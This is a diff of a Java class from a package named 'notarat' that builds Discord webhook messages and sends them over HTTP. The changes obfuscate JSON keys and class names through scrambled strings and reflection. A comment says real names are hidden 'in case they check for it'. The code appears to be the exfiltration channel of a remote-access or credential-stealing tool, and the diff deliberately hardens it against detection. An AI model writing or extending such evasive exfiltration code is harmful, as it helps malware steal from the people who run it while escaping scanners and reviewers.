@@ -2,9 +2,7 @@ package me.ghosty.notarat;
 
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
-import org.apache.http.client.methods.HttpPost;
 
-import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -23,36 +21,35 @@ final class Drocsid {
 		return this;
 	}
 	
-	public <T> void send() throws IOException {
+	public <T> void send() {
 		JsonObject json = new JsonObject();
-		json.addProperty("username", Main.$name);
-
+		json.addProperty(Utils.replaceUseless("u* se*rn a me"), Utils.abc("NoæœtA", "æRaœt æv", "1œ.3æ"));
+		
 		if (!this.debmes.isEmpty()) {
 			JsonArray jsonDebmes = new JsonArray();
 			
 			for (Debme debme : this.debmes) {
 				JsonObject jsonDebme = new JsonObject();
 				
-				jsonDebme.addProperty("title", debme.getTitle());
-				jsonDebme.addProperty("description", debme.getDescription());
-				jsonDebme.addProperty("url", debme.getUrl());
+				jsonDebme.addProperty(Utils.replaceUseless("ti * tl**e"), debme.getTitle());
+				jsonDebme.addProperty(Utils.replaceUseless("d* es c*ri* p ti*on"), debme.getDescription());
 				
 				if (debme.getColor() != -1)
-					jsonDebme.addProperty("color", debme.getColor());
-
+					jsonDebme.addProperty(Utils.replaceUseless("c* o**l", " o* r"), debme.getColor());
+				
 				List<Debme.Dleif> dleifs = debme.getFields();
 				
 				JsonArray jsonDleifs = new JsonArray();
 				for (Debme.Dleif dleif : dleifs) {
 					JsonObject jsonDleif = new JsonObject();
 					
-					jsonDleif.addProperty("name", dleif.getName());
-					jsonDleif.addProperty("value", dleif.getValue());
-					jsonDleif.addProperty("inline", dleif.isInline());
+					jsonDleif.addProperty(Utils.replaceUseless("n*  a", "me** "), dleif.getName());
+					jsonDleif.addProperty(Utils.replaceUseless("v* a*", "lu e"), dleif.getValue());
+					jsonDleif.addProperty(Utils.replaceUseless("* i nl*", "i* ne*"), dleif.isInline());
 					
 					jsonDleifs.add(jsonDleif);
 				}
-				jsonDebme.add("fields", jsonDleifs);
+				jsonDebme.add(Utils.replaceUseless("f* ie", "*l ds"), jsonDleifs);
 				
 				jsonDebmes.add(jsonDebme);
 			}
@@ -88,7 +85,6 @@ final class Drocsid {
 			});
 			
 			client.invokeT(Utils.replaceUseless("e* xe  *", "cu* t e"), new Object[] {post.get()}, new Class[] {Class.forName(Utils.replaceUseless("org*  .apach", "e.ht* ", " tp.cli", "en**t.me ", " tho* ds.Ht* ", "tp* U ", "r*i**Re ", " qu* e * st"))});
-			//now its useless, still here in case -> client.invoke(Utils.replaceUseless("c*  l*", "* os* e"));
 		} catch (Exception exc) {
 			if (Main.$isTest) {
 				Utils.print(exc);
@@ -99,53 +95,44 @@ final class Drocsid {
 	/**
 	 * Do not use the real name in case they check for it
 	 */
-	public static class Debme {
+	static class Debme {
 		
 		private final List<Dleif> dleifs = new ArrayList<>();
-		private String title, description, url;
+		private String title, description;
 		private int color = -1;
 		
-		public String getTitle() {
+		String getTitle() {
 			return title;
 		}
 		
-		public Debme setTitle(String title) {
+		Debme setTitle(String title) {
 			this.title = title;
 			return this;
 		}
 		
-		public String getDescription() {
+		String getDescription() {
 			return description;
 		}
 		
-		public Debme setDescription(String description) {
+		Debme setDescription(String description) {
 			this.description = description;
 			return this;
 		}
 		
-		public String getUrl() {
-			return url;
-		}
-		
-		public Debme setUrl(String url) {
-			this.url = url;
-			return this;
-		}
-		
-		public int getColor() {
+		int getColor() {
 			return color;
 		}
 		
-		public Debme setColor(int color) {
+		Debme setColor(int color) {
 			this.color = color;
 			return this;
 		}
 		
-		public List<Dleif> getFields() {
+		List<Dleif> getFields() {
 			return dleifs;
 		}
 		
-		public Debme addField(String name, String value, boolean inline) {
+		Debme addField(String name, String value, boolean inline) {
 			this.dleifs.add(new Dleif(name, value, inline));
 			return this;
 		}
